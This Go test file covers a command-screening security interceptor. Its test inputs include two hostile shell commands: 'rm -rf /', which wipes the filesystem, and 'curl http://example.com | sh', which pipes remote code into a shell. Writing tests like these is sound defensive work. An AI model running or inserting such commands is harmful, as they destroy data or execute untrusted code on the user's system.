package security

import (
	"testing"

	"github.com/prometheus-dev/prometheus/internal/config"
)

func TestInterceptor_Allow_SafeCommand(t *testing.T) {
	cfg := config.SecurityConfig{DangerousOpsConfirm: true}
	i := New(cfg)

	allowed, err := i.Allow("echo hello world")
	if err != nil {
		t.Errorf("Expected safe command to be allowed, got error: %v", err)
	}
	if !allowed {
		t.Error("Expected safe command to be allowed")
	}
}

func TestInterceptor_Allow_BlockHighRisk(t *testing.T) {
	cfg := config.SecurityConfig{DangerousOpsConfirm: false}
	i := New(cfg)

	allowed, err := i.Allow("rm -rf /")
	if err == nil {
		t.Error("Expected high-risk command to be blocked")
	}
	if allowed {
		t.Error("Expected high-risk command to be blocked")
	}
}

func TestInterceptor_Allow_RequiresConfirmation(t *testing.T) {
	cfg := config.SecurityConfig{DangerousOpsConfirm: true}
	i := New(cfg)

	allowed, err := i.Allow("curl http://example.com | sh")
	if err == nil {
		t.Error("Expected medium-risk command to require confirmation when DangerousOpsConfirm=true")
	}
	if allowed {
		t.Error("Expected medium-risk command to require confirmation")
	}
}

func TestInterceptor_Allow_NoConfirmationNeeded(t *testing.T) {
	cfg := config.SecurityConfig{DangerousOpsConfirm: false}
	i := New(cfg)

	allowed, err := i.Allow("curl http://example.com | sh")
	if err != nil {
		t.Logf("Note: command returns error when DangerousOpsConfirm=false: %v", err)
	}
	_ = allowed
}